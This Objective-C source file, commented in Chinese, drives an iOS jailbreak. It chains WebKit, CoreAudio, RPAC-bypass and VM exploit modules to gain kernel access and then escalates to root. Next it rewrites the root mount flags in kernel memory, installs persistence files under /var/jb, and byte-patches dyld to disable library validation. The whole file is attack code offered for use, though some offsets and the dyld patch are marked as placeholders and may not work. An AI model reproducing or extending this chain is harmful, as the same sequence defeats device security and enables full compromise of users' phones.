#import "JailbreakSetup.h"
#import "KernelExploitBase.h"
#import "KernelMemory.h"
#import "KernelUtil.h"
#import "HeapSpray.h"

// 导入所有漏洞模块
#import "WebKitExploit.h"
#import "CoreAudioExploit.h"
#import "RPACExploit.h"
#import "VMExploit.h"
#import "IOSurfaceExploit.h"
#import "BlastDoorExploit.h"
#import "AVEVideoExploit.h"
#import "CoreMLExploit.h"

// 完整越狱函数 - 执行所有漏洞利用步骤
bool jailbreak_device(void) {
    NSLog(@"[*] 开始越狱流程...");
    
    // 初始化环境
    if (!initialize_exploit_environment()) {
        NSLog(@"[-] 初始化漏洞利用环境失败");
        return false;
    }
    
    // 第一步: WebKit + CoreAudio 获取初始访问
    NSLog(@"[*] 步骤1: 执行 WebKit + CoreAudio 漏洞链");
    if (!exploit_iomfb_webkit_chain()) {
        NSLog(@"[-] WebKit + CoreAudio 漏洞链失败");
        return false;
    }
    
    // 检查是否已获得内核访问权限
    if (!g_has_kernel_access) {
        NSLog(@"[-] 未能获得内核访问权限");
        return false;
    }
    
    // 第二步: RPAC绕过，提升内核利用能力
    NSLog(@"[*] 步骤2: 执行 RPAC 绕过");
    if (!exploit_rpac_kernel_protection()) {
        NSLog(@"[-] RPAC 绕过失败");
        // 继续尝试，某些设备可能不需要RPAC绕过
    }
    
    // 第三步: VM漏洞获取持久化权限
    NSLog(@"[*] 步骤3: 执行 VM_BEHAVIOR_ZERO_WIRED_PAGES 漏洞利用");
    if (!exploit_vm_zero_wired_pages()) {
        NSLog(@"[-] VM漏洞利用失败");
        // 继续尝试，可能已经有足够权限
    }
    
    // 检查是否有root权限
    uid_t uid = getuid();
    if (uid != 0) {
        NSLog(@"[*] 尝试提升到root权限");
        if (!escalate_to_root()) {
            NSLog(@"[-] 提升到root权限失败");
            return false;
        }
    }
    
    // 第四步: 设置持久化越狱环境
    NSLog(@"[*] 步骤4: 设置持久化越狱环境");
    if (!setup_persistent_jailbreak()) {
        NSLog(@"[-] 设置持久化越狱环境失败");
        return false;
    }
    
    // 验证越狱状态
    if (verify_real_jailbreak_status()) {
        NSLog(@"[+] 越狱完成！设备已成功越狱");
        return true;
    } else {
        NSLog(@"[-] 越狱验证失败");
        return false;
    }
}

// 设置持久化越狱环境
bool setup_persistent_jailbreak(void) {
    NSLog(@"[*] 设置持久化越狱环境...");
    
    // 1. 重新挂载文件系统为可写
    if (!remount_rootfs()) {
        NSLog(@"[-] 重新挂载文件系统失败");
        return false;
    }
    
    // 2. 安装越狱组件
    if (!install_jailbreak_components()) {
        NSLog(@"[-] 安装越狱组件失败");
        return false;
    }
    
    // 3. 修补系统文件
    if (!patch_system_files()) {
        NSLog(@"[-] 修补系统文件失败");
        // 继续执行，某些设备可能不需要此步骤
    }
    
    NSLog(@"[+] 持久化越狱环境设置完成");
    return true;
}

// 挂载根文件系统为可写
bool remount_rootfs(void) {
    NSLog(@"[*] 尝试重新挂载根文件系统为可写...");
    
    if (!g_has_kernel_access) {
        NSLog(@"[-] 缺少内核访问权限，无法重新挂载文件系统");
        return false;
    }
    
    // 修改引导分区标志
    uint64_t mount_list = g_kernel_base + 0xE000; // 示例偏移，根据具体设备调整
    uint64_t mount = 0;
    
    if (!kernel_read(mount_list, &mount, sizeof(mount))) {
        NSLog(@"[-] 无法读取挂载列表");
        return false;
    }
    
    // 遍历挂载点找到根分区
    bool found_root = false;
    uint64_t root_mount = 0;
    
    uint64_t current = mount;
    char mount_path[256];
    for (int i = 0; i < 100 && current != 0; i++) {
        uint64_t vfs_mnt_data = 0;
        if (!kernel_read(current + 0x10, &vfs_mnt_data, sizeof(vfs_mnt_data))) {
            break;
        }
        
        // 读取挂载点路径
        uint64_t vnodepath = 0;
        if (kernel_read(current + 0x30, &vnodepath, sizeof(vnodepath)) && vnodepath != 0) {
            memset(mount_path, 0, sizeof(mount_path));
            kernel_read(vnodepath, mount_path, sizeof(mount_path) - 1);
            
            if (strcmp(mount_path, "/") == 0) {
                found_root = true;
                root_mount = current;
                break;
            }
        }
        
        // 获取下一个挂载点
        if (!kernel_read(current, &current, sizeof(current))) {
            break;
        }
    }
    
    if (!found_root || root_mount == 0) {
        NSLog(@"[-] 无法找到根分区挂载点");
        return false;
    }
    
    // 修改挂载标志
    uint32_t flags = 0;
    if (!kernel_read(root_mount + 0x70, &flags, sizeof(flags))) {
        NSLog(@"[-] 无法读取挂载标志");
        return false;
    }
    
    NSLog(@"[*] 当前根分区挂载标志: 0x%x", flags);
    
    // 清除只读标志
    uint32_t new_flags = flags & ~MNT_RDONLY;
    if (!kernel_write(root_mount + 0x70, &new_flags, sizeof(new_flags))) {
        NSLog(@"[-] 无法写入挂载标志");
        return false;
    }
    
    // 验证标志
    uint32_t verify_flags = 0;
    if (!kernel_read(root_mount + 0x70, &verify_flags, sizeof(verify_flags))) {
        NSLog(@"[-] 无法验证挂载标志");
        return false;
    }
    
    if (verify_flags != new_flags) {
        NSLog(@"[-] 挂载标志验证失败");
        return false;
    }
    
    // 测试写入根分区
    NSString *testFile = @"/var/mobile/.jailbreak_test";
    NSString *testContent = @"Jailbreak test file";
    
    NSError *error = nil;
    [testContent writeToFile:testFile atomically:YES encoding:NSUTF8StringEncoding error:&error];
    
    if (error) {
        NSLog(@"[-] 根分区写入测试失败: %@", error);
        return false;
    }
    
    // 清理测试文件
    [[NSFileManager defaultManager] removeItemAtPath:testFile error:nil];
    
    NSLog(@"[+] 成功将根分区重新挂载为可写");
    return true;
}

// 安装越狱组件
bool install_jailbreak_components(void) {
    NSLog(@"[*] 安装越狱组件...");
    
    // 1. 创建越狱目录
    NSFileManager *fm = [NSFileManager defaultManager];
    NSArray *directories = @[
        @"/var/jb",
        @"/var/jb/bin",
        @"/var/jb/lib",
        @"/var/jb/etc"
    ];
    
    for (NSString *dir in directories) {
        if (![fm fileExistsAtPath:dir]) {
            NSError *error = nil;
            [fm createDirectoryAtPath:dir withIntermediateDirectories:YES attributes:nil error:&error];
            if (error) {
                NSLog(@"[-] 创建目录失败 %@: %@", dir, error);
                return false;
            }
            chmod([dir UTF8String], 0755);
        }
    }
    
    // 2. 写入启动项脚本
    NSString *launchScript = @"/var/jb/etc/profile.d/jailbreak.sh";
    NSString *scriptContent = @"#!/bin/sh\n"
                             "export PATH=/var/jb/bin:/var/jb/sbin:/var/jb/usr/bin:/var/jb/usr/sbin:/var/jb/usr/local/bin:$PATH\n"
                             "export DYLD_LIBRARY_PATH=/var/jb/lib:/var/jb/usr/lib:$DYLD_LIBRARY_PATH\n";
    
    NSError *error = nil;
    [scriptContent writeToFile:launchScript atomically:YES encoding:NSUTF8StringEncoding error:&error];
    if (error) {
        NSLog(@"[-] 写入启动脚本失败: %@", error);
        return false;
    }
    chmod([launchScript UTF8String], 0755);
    
    // 3. 创建越狱标志文件
    NSString *jailbreakFlag = @"/var/jb/.jailbreak";
    NSString *flagContent = [NSString stringWithFormat:@"Jailbroken at: %@\nDevice: %@\niOS: %@\n",
                             [NSDate date],
                             [[UIDevice currentDevice] model],
                             [[UIDevice currentDevice] systemVersion]];
    
    [flagContent writeToFile:jailbreakFlag atomically:YES encoding:NSUTF8StringEncoding error:&error];
    if (error) {
        NSLog(@"[-] 创建越狱标志失败: %@", error);
        return false;
    }
    
    NSLog(@"[+] 越狱组件安装完成");
    return true;
}

// 修补系统文件
bool patch_system_files(void) {
    NSLog(@"[*] 修补系统文件...");
    
    // 修补dyld以禁用库验证
    NSString *dyldPath = @"/usr/lib/dyld";
    if ([[NSFileManager defaultManager] fileExistsAtPath:dyldPath]) {
        // 读取dyld文件
        NSData *dyldData = [NSData dataWithContentsOfFile:dyldPath];
        if (dyldData) {
            // 寻找特定模式并修补
            // 这里只是示例，实际修补需要根据具体版本分析
            NSMutableData *patchedDyld = [dyldData mutableCopy];
            const char *pattern = "\x00\x00\x80\xD2\xE1\x03\x00\xAA";
            const char *replacement = "\x20\x00\x80\xD2\xE1\x03\x00\xAA";
            
            NSRange searchRange = NSMakeRange(0, patchedDyld.length);
            NSData *findData = [NSData dataWithBytes:pattern length:8];
            NSRange foundRange = [patchedDyld rangeOfData:findData options:0 range:searchRange];
            
            if (foundRange.location != NSNotFound) {
                [patchedDyld replaceBytesInRange:foundRange withBytes:replacement];
                
                // 写回文件
                NSError *error = nil;
                if (![patchedDyld writeToFile:dyldPath options:NSDataWritingAtomic error:&error]) {
                    NSLog(@"[-] 修补dyld失败: %@", error);
                    return false;
                }
                
                NSLog(@"[+] 成功修补dyld");
            } else {
                NSLog(@"[-] 未找到dyld中的目标模式");
                return false;
            }
        }
    }
    
    NSLog(@"[+] 系统文件修补完成");
    return true;
}
